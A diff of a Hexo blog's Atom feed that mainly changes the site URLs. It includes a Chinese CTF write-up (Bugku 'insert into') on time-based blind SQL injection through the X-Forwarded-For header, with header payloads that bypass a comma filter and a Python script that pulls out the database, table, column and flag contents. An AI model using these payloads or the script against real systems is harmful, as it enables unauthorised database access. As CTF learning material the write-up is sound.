@@ -5,9 +5,9 @@
   <subtitle>W&#39;Note</subtitle>
   <link href="/atom.xml" rel="self"/>
   
-  <link href="http://yoursite.com/"/>
-  <updated>2019-08-24T08:36:52.993Z</updated>
-  <id>http://yoursite.com/</id>
+  <link href="http://dddwmr.github.io/"/>
+  <updated>2019-08-24T08:59:23.112Z</updated>
+  <id>http://dddwmr.github.io/</id>
   
   <author>
     <name>ddd_wmr</name>
@@ -18,21 +18,22 @@
   
   <entry>
     <title>insert int0</title>
-    <link href="http://yoursite.com/2019/08/25/insert-int0/"/>
-    <id>http://yoursite.com/2019/08/25/insert-int0/</id>
+    <link href="http://dddwmr.github.io/2019/08/25/insert-int0/"/>
+    <id>http://dddwmr.github.io/2019/08/25/insert-int0/</id>
     <published>2019-08-24T16:03:15.000Z</published>
-    <updated>2019-08-24T08:36:52.993Z</updated>
+    <updated>2019-08-24T08:59:23.112Z</updated>
     
-    <content type="html"><![CDATA[<p>&lt;img src=”_posts/insert-int0”,alt=”R”,width=600 height=300&gt;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+    <content type="html"><![CDATA[<img src="/2019/08/25/insert-int0/1-01.png" title="This is an example image"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;&amp;lt;img src=”_posts/insert-int0”,alt=”R”,width=600 height=300&amp;gt;&lt;/p&gt;
+        &lt;img src=&quot;/2019/08/25/insert-int0/1-01.png&quot; title=&quot;This is an example image&quot;&gt;
+
 &lt;script&gt;
         document.querySelectorAll(&#39;.github-emoji&#39;)
-       
+ 
       
     
     </summary>
@@ -42,31 +43,31 @@
   
   <entry>
     <title>insert into</title>
-    <link href="http://yoursite.com/2019/08/24/insert%20into/"/>
-    <id>http://yoursite.com/2019/08/24/insert into/</id>
+    <link href="http://dddwmr.github.io/2019/08/24/insert%20into/"/>
+    <id>http://dddwmr.github.io/2019/08/24/insert into/</id>
     <published>2019-08-24T00:00:00.000Z</published>
     <updated>2019-08-24T07:36:16.821Z</updated>
     
-    <content type="html"><![CDATA[<p>#insert into</p><p><img src="/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-01.png" alt="1-01"></p><p>观察题目</p><p><img src="/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-02.png" alt="1-02"></p><p>可以看到注入点应该在http头的x-forwarded-for上</p><p><img src="/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-03.png" alt="1-03"></p><p>这里还把‘，’过滤了</p><p><img src="/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-04.png" alt="1-04"></p><p>因为把，过滤了 if是用不了<br>这里用select case when..then..else..end代替<br>substr也用不了 但是可以用 from 1 for 1代替<br>为了节约时间，可以先手工查字段长度<br>这里以database()做示范:</p><p><strong>x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a</strong></p><p><img src="/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-05.png" alt="1-05"></p><p>可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：<br><strong>x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a</strong></p><p><img src="/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-06.png" alt="1-06"></p><p>当然转成ascii码用二分法更有效率<br>但为了更加方便 这里写一个脚本</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">!/usr/bin/python</span><br><span class="line"></span><br><span class="line">-*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">mystring = string.ascii_letters+string.digits#所有字母和数字的集合</span><br><span class="line">url='http://123.206.87.240:8002/web15/'</span><br><span class="line">#查库名</span><br><span class="line">data = "127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1"  #这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15</span><br><span class="line">#查表名</span><br><span class="line">data = "1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"#查出来时clineip和flag</span><br><span class="line">#查字段名</span><br><span class="line">data = "1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span><br><span class="line">#查出来是 flag</span><br><span class="line">#查内容</span><br><span class="line">data= "1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 "</span><br><span class="line">flag = ''</span><br><span class="line">for i in range(1,6):#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以</span><br><span class="line">    for j in mystring:</span><br><span class="line">        try:</span><br><span class="line">            headers = {'x-forwarded-for':data.format(str(i),j)}#format格式化输出，把查到的str的每一字符依次赋到{0}里去</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=3)#一旦延时超过3s，继续向下执行代码</span><br><span class="line">        except requests.exceptions.ReadTimeout:#跳到这里执行，得到所求</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print('The final flag:'+flag)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}<br>（最好每次只开一个运行 不然出错概率太大）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+    <content type="html"><![CDATA[<p>#insert into</p><p><img src="//yoursite.com/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-01.png" alt="1-01"></p><p>观察题目</p><p><img src="//yoursite.com/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-02.png" alt="1-02"></p><p>可以看到注入点应该在http头的x-forwarded-for上</p><p><img src="//yoursite.com/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-03.png" alt="1-03"></p><p>这里还把‘，’过滤了</p><p><img src="//yoursite.com/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-04.png" alt="1-04"></p><p>因为把，过滤了 if是用不了<br>这里用select case when..then..else..end代替<br>substr也用不了 但是可以用 from 1 for 1代替<br>为了节约时间，可以先手工查字段长度<br>这里以database()做示范:</p><p><strong>x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a</strong></p><p><img src="//yoursite.com/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-05.png" alt="1-05"></p><p>可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：<br><strong>x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a</strong></p><p><img src="//yoursite.com/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-06.png" alt="1-06"></p><p>当然转成ascii码用二分法更有效率<br>但为了更加方便 这里写一个脚本</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">!/usr/bin/python</span><br><span class="line"></span><br><span class="line">-*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">mystring = string.ascii_letters+string.digits#所有字母和数字的集合</span><br><span class="line">url='http://123.206.87.240:8002/web15/'</span><br><span class="line">#查库名</span><br><span class="line">data = "127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1"  #这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15</span><br><span class="line">#查表名</span><br><span class="line">data = "1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"#查出来时clineip和flag</span><br><span class="line">#查字段名</span><br><span class="line">data = "1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span><br><span class="line">#查出来是 flag</span><br><span class="line">#查内容</span><br><span class="line">data= "1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 "</span><br><span class="line">flag = ''</span><br><span class="line">for i in range(1,6):#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以</span><br><span class="line">    for j in mystring:</span><br><span class="line">        try:</span><br><span class="line">            headers = {'x-forwarded-for':data.format(str(i),j)}#format格式化输出，把查到的str的每一字符依次赋到{0}里去</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=3)#一旦延时超过3s，继续向下执行代码</span><br><span class="line">        except requests.exceptions.ReadTimeout:#跳到这里执行，得到所求</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print('The final flag:'+flag)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}<br>（最好每次只开一个运行 不然出错概率太大）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
     
     <summary type="html">
     
       
       
         &lt;p&gt;#insert into&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-01.png&quot; alt=&quot;1-01&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;//yoursite.com/2019/08/24/insert into/C:%5Chexo%5Csource%5Cimg%5C1-01.png&quot; alt=&quot;1-01&quot;&gt;&lt;/p&gt;
 &lt;p&gt;观察题目&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/2019
+&lt;p&gt;&lt;
       
     
     </summary>
     
-      <category term="ctfweb" scheme="http://yoursite.com/categories/ctfweb/"/>
+      <category term="ctfweb" scheme="http://dddwmr.github.io/categories/ctfweb/"/>
     
     
-      <category term="bugku" scheme="http://yoursite.com/tags/bugku/"/>
+      <category term="bugku" scheme="http://dddwmr.github.io/tags/bugku/"/>
     
-      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+      <category term="sql注入" scheme="http://dddwmr.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
